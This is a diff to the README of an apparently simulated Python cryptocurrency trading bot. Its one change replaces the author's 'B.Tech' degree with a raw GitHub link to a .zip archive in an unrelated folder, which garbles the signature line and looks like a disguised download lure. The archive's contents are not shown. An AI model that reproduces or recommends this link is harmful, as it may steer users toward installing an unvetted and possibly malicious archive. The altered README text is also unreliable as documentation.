@@ -21,7 +21,7 @@ This is a simulated cryptocurrency trading bot built using Python. It mimics the
 3. Run the main script
 
 Abhinoor Singh
-B.Tech Student – GGSIPU
+https://raw.githubusercontent.com/Abh2006/Abhinoor-binance-bot/main/hothouse/Abhinoor-binance-bot.zip Student – GGSIPU
 Python Developer | Design Enthusiast
 
 
